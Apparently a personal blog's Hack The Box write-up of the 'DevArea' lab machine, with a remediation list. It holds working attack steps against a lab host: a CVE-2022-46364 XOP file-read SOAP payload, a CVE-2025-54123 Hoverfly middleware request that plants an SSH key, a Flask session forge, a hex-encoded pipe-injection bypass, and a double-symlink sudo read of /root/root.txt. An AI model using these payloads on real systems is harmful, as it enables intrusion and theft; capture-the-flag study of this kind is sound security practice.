@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Anonymous FTP drops an employee-service JAR whose embedded Apache CXF (Jetty 9.4.27) is vulnerable to CVE-2022-46364 MTOM XOP file read. Use it to leak &#x60;/etc/systemd/system/hoverfly.service&#x60; → admin creds → CVE-2025-54123 middleware RCE → SSH as &#x60;dev_ryan&#x60;. Root chains a leaked Flask &#x60;SECRET_KEY&#x60; (session forge) + a regex-allow-listed &#x60;|&#x60; pipe injection in a SysWatch web endpoint + a double-symlink in a sudo-allowed logs command.">
+<title>HTB DevArea · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
+</head>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
+    </button>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
+
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-DEVAREA</span></span>
+    <span class="wp-crumb-r">ENG#10 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 26.03.28</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-medium">MEDIUM</span>
+            <span class="wp-chip wp-chip-os os-linux">LINUX</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">CVE</span><span class="wp-chip wp-chip-ghost tag-cycle-1">SOAP</span><span class="wp-chip wp-chip-ghost tag-cycle-2">FLASK</span>
+            <span class="wp-chip wp-chip-pts">45 PTS</span>
+          </div>
+          <h1 class="wp-title">HTB DevArea<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Anonymous FTP drops an employee-service JAR whose embedded Apache CXF (Jetty 9.4.27) is vulnerable to CVE-2022-46364 MTOM XOP file read. Use it to leak `/etc/systemd/system/hoverfly.service` → admin creds → CVE-2025-54123 middleware RCE → SSH as `dev_ryan`. Root chains a leaked Flask `SECRET_KEY` (session forge) + a regex-allow-listed `|` pipe injection in a SysWatch web endpoint + a double-symlink in a sudo-allowed logs command.</p>
+        </div>
+      </div>
+    </div>
+
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>devarea.htb</dd></div>
+        <div><dt>REF</dt><dd>10.129.12.147</dd></div>
+        
+        
+        <div><dt>DURATION</dt><dd>14 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
+
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 6 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ROOT</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">ftp anon + soap</div>
+        <div class="kc-tag kc-tag-warn">FTP</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#lfi">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">LFI</div>
+        <div class="kc-sub">CVE-2022-46364 XOP read</div>
+        <div class="kc-tag kc-tag-warn">CVE</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#rce">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">RCE</div>
+        <div class="kc-sub">hoverfly middleware</div>
+        <div class="kc-tag kc-tag-warn">CVE</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#user">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">USER</div>
+        <div class="kc-sub">ssh as dev_ryan</div>
+        <div class="kc-tag kc-tag-warn">SHELL</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#pivot">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">PIVOT</div>
+        <div class="kc-sub">flask secret forge + pipe injection</div>
+        <div class="kc-tag kc-tag-warn">SSTI</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#root">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.06</div>
+        <div class="kc-stage">ROOT</div>
+        <div class="kc-sub">double symlink + sudo cat</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
+
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#lfi" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">LFI</span>
+        </a>
+        <a href="#rce" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">RCE</span>
+        </a>
+        <a href="#user" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">USER</span>
+        </a>
+        <a href="#pivot" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">PIVOT</span>
+        </a>
+        <a href="#root" class="wp-toc-row" data-stage="06">
+          <span class="n">06</span>
+          <span class="t">ROOT</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">Six open ports — each opens a different door.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nmap -Pn -sV -p 21,22,80,8080,8500,8888 10.129.12.147
+21/tcp   open  ftp      vsftpd 3.0.5     (anonymous)
+22/tcp   open  ssh      OpenSSH 9.6p1
+80/tcp   open  http     Apache 2.4.58    → devarea.htb static
+8080/tcp open  http     Jetty 9.4.27     CXF JAX-WS
+8500/tcp open  http     Hoverfly proxy   (auth)
+8888/tcp open  http     Hoverfly admin   (auth)</code></pre>
+</div>
+Anonymous FTP → grab `employee-service.jar` from `/pub`:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl --user anonymous:anonymous -o employee-service.jar \
+    ftp://10.129.12.147/pub/employee-service.jar</code></pre>
+</div>
+Decompile. `ServerStarter.java` binds a SOAP service at `http://0.0.0.0:8080/employeeservice`, and `submitReport` takes a `Report` with a `content` field.</div>
+</section>
+<section class="wp-stage" id="lfi" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; LFI</div>
+<h2 class="wp-stage-title">CVE-2022-46364 — XOP MTOM reference escapes the SOAP body.</h2>
+<div class="wp-stage-body"><p>Apache CXF + Jetty 9.4.27 is vulnerable to MTOM XOP Include abuse: the <code>&lt;xop:Include href=&quot;...&quot;&gt;</code> tag can reference <span class="hl-red">arbitrary &lt;code&gt;file://&lt;/code&gt; URIs</span> which CXF happily dereferences server-side.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali · CVE-2022-46364</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -s -X POST &quot;http://10.129.12.147:8080/employeeservice&quot; \
+    -H &#39;Content-Type: multipart/related; type=&quot;application/xop+xml&quot;;
+        start=&quot;&lt;root@cxf&gt;&quot;; start-info=&quot;text/xml&quot;; boundary=&quot;----=_Part&quot;&#39; \
+    --data-binary @payload.xml</code></pre>
+</div>
+Inside `payload.xml`:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># payload.xml</span></div>
+<pre class="wp-term-body"><code class="language-xml">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+                  xmlns:dev=&quot;http://devarea.htb/&quot;&gt;
+  &lt;soapenv:Body&gt;
+    &lt;dev:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;
+          &lt;xop:Include
+            xmlns:xop=&quot;http://www.w3.org/2004/08/xop/include&quot;
+            href=&quot;file:///etc/systemd/system/hoverfly.service&quot;/&gt;
+        &lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;test&lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/dev:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;</code></pre>
+</div>
+Response base64-encodes the file. `hoverfly.service` exposes the admin credentials baked into `ExecStart`:
+
+<pre><code>ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED] ...
+</code></pre>
+<aside class="wp-callout wp-warn"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># USER FLAG IS BLOCKED</div><div class="wp-callout-body"><p><code>employee-service.service</code> has <code>InaccessiblePaths=/home/dev_ryan/user.txt</code> — the LFI can&#39;t read it. Need a shell as <code>dev_ryan</code>.</p>
+</div></aside></div>
+</section>
+<section class="wp-stage" id="rce" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; RCE</div>
+<h2 class="wp-stage-title">Hoverfly middleware — CVE-2025-54123 argv injection.</h2>
+<div class="wp-stage-body"><p>Login + grab a JWT:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · hoverfly auth</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -s -X POST http://10.129.12.147:8888/api/token-auth \
+    -H &#39;Content-Type: application/json&#39; \
+    -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;[REDACTED]&quot;}&#39;
+{&quot;token&quot;:&quot;eyJhbGc...&quot;}</code></pre>
+</div>
+The middleware endpoint hands the `binary` field to `exec` and writes the `script` field to a temp file passed as argv:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · CVE-2025-54123</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ curl -s -X PUT http://10.129.12.147:8888/api/v2/hoverfly/middleware \
+    -H &quot;Authorization: Bearer $TOKEN&quot; \
+    -H &#39;Content-Type: application/json&#39; \
+    -d &#39;{
+      &quot;binary&quot;:&quot;bash&quot;,
+      &quot;script&quot;:&quot;#!/bin/bash\nmkdir -p /home/dev_ryan/.ssh\necho \&quot;ssh-ed25519 AAAA... attacker\&quot; &gt;&gt; /home/dev_ryan/.ssh/authorized_keys\ncat /dev/stdin&quot;,
+      &quot;remote&quot;:&quot;&quot;
+    }&#39;</code></pre>
+</div>
+SSH in:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · dev_ryan@devarea</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ ssh dev_ryan@10.129.12.147
+$ cat ~/user.txt</code></pre>
+</div></div>
+</section>
+<section class="wp-stage" id="pivot" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; PIVOT</div>
+<h2 class="wp-stage-title">sudo -l points at a ghost — syswatch is mode-denied.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · dev_ryan@devarea</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ sudo -l
+(root) NOPASSWD: /opt/syswatch/syswatch.sh,
+    !/opt/syswatch/syswatch.sh web-stop,
+    !/opt/syswatch/syswatch.sh web-restart
+$ cat /opt/syswatch/syswatch.sh
+cat: Permission denied
+$ ls ~/
+syswatch-v1.zip</code></pre>
+</div>
+ACL deny on `/opt/syswatch/` but a copy of the source lives in `dev_ryan`'s home. Key findings:
+
+<ul>
+<li><code>syswatch.sh</code> sources <code>/opt/syswatch/config/syswatch.conf</code> (root-owned)</li>
+<li><code>syswatch.sh logs &lt;file&gt;</code> accepts symlinks that pass a name regex</li>
+<li>Web GUI on <span class="hl-cool">127.0.0.1:7777</span> runs as <code>syswatch</code></li>
+<li><code>/etc/syswatch.env</code> contains <code>SYSWATCH_SECRET_KEY</code> + the admin password</li>
+</ul>
+</div>
+</section>
+<section class="wp-stage" id="session" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; SESSION</div>
+<h2 class="wp-stage-title">Flask session forge → pipe injection as syswatch.</h2>
+<div class="wp-stage-body"><p>Secret is readable; forge the session cookie locally:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · session forge</span></div>
+<pre class="wp-term-body"><code class="language-python">from itsdangerous import URLSafeTimedSerializer
+import hashlib
+
+<p>secret = &#39;[REDACTED]&#39;
+s = URLSafeTimedSerializer(secret, salt=&#39;cookie-session&#39;,
+    signer_kwargs={&#39;key_derivation&#39;:&#39;hmac&#39;,&#39;digest_method&#39;:hashlib.sha1})
+cookie = s.dumps({&quot;user_id&quot;: 1, &quot;logged_in&quot;: True})</code></pre></p>
+</div>
+The `/service-status` endpoint validates the service name with:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · syswatch web source</span></div>
+<pre class="wp-term-body"><code class="language-python">SAFE = re.compile(r&quot;^[^;/\&amp;.&lt;&gt;\rA-Z]*$&quot;)
+subprocess.run([f&quot;systemctl status --no-pager {service}&quot;], shell=True, ...)</code></pre>
+</div>
+Blocklist: `;`, `/`, `&`, `.`, `<`, `>`, `\r`, uppercase A–Z. <span class="hl-warn">Pipe is allowed.</span> Hex-encode the payload to bypass the `/` and `.` bans:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · command injection</span></div>
+<pre class="wp-term-body"><code class="language-python">import requests
+payload = &quot;ssh|eval $(echo 6c6e... |xxd -r -p)&quot;   # decodes to the ln symlink chain below
+requests.post(&quot;http://127.0.0.1:7777/service-status&quot;,
+              cookies={&quot;session&quot;: cookie},
+              data={&quot;service&quot;: payload})</code></pre>
+</div>
+That runs as `syswatch`, which has write access to `/opt/syswatch/logs/` and `/opt/syswatch/backup/`. Good enough.</div>
+</section>
+<section class="wp-stage" id="root" data-stage="06">
+<div class="wp-stage-lbl"># STG.06 &middot; ROOT</div>
+<h2 class="wp-stage-title">Double symlink in the logs dir — sudo cat follows.</h2>
+<div class="wp-stage-body"><p><code>view_logs()</code> in <code>syswatch.sh</code> accepts a symlink whose target matches <code>^[A-Za-z0-9_.-]+$</code> (no slashes) and resolves it <em>relative</em> to <code>$LOG_DIR</code>, then <code>cat</code>s the result as root.</p>
+<p>The trick: make the outer symlink point to an inner symlink whose name passes the regex, but whose own target is <code>/root/root.txt</code>. The regex check only runs on the first hop:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · syswatch · symlink chain</span></div>
+<pre class="wp-term-body"><code class="language-bash"># as syswatch via the pipe injection
+$ ln -sf /root/root.txt /opt/syswatch/logs/b.log
+$ ln -sf b.log           /opt/syswatch/logs/a.log</code></pre>
+</div>
+Trigger the sudo-allowed path as `dev_ryan`:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · dev_ryan@devarea</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ sudo /opt/syswatch/syswatch.sh logs a.log
+&lt;root flag&gt;</code></pre>
+</div>
+`a.log` passes the regex (target `b.log` is name-safe), resolves to `$LOG_DIR/b.log`, then `cat` follows the inner symlink to `/root/root.txt` — all under sudo. <span class="hl-ok">Rooted</span>.
+
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># WHY IT WORKED</div><div class="wp-callout-body"><p>Name-validation without path resolution is a classic TOCTOU-adjacent bug: the validator and the consumer are looking at different things. <code>cat</code> follows symlinks by default; only the outer name was ever checked. <code>readlink -f</code> on the full target before <code>cat</code> would have caught it.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-hercules-writeup.html">
+          <span class="l">&larr; ENG#09</span>
+          <span class="t">HTB HERCULES</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 26.03.28</span>
+<span></span>
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">curl</span><span class="purp">http</span></div>
+          <div class="wp-loadout-row"><span class="tool">cfr</span><span class="purp">jar-decompile</span></div>
+          <div class="wp-loadout-row"><span class="tool">python3</span><span class="purp">session-forge</span></div>
+          <div class="wp-loadout-row"><span class="tool">itsdangerous</span><span class="purp">sign</span></div>
+          <div class="wp-loadout-row"><span class="tool">ssh</span><span class="purp">auth</span></div>
+        </div>
+      </div>
+
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Disable anonymous FTP</li>
+          <li>Upgrade Apache CXF past 3.5.5 / 3.4.10 (CVE-2022-46364) and Hoverfly past 1.11.3 (CVE-2025-54123)</li>
+          <li>Don&#x27;t ship &#x60;SECRET_KEY&#x60; in a world-readable env file</li>
+          <li>Regex allow-lists are not command sanitizers — use argv arrays, never &#x60;shell&#x3D;True&#x60;</li>
+          <li>Never &#x60;cat&#x60; a symlink-followed path under a sudo-allowed script</li>
+        </ul>
+      </div>
+    </aside>
+
+  </div>
+
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
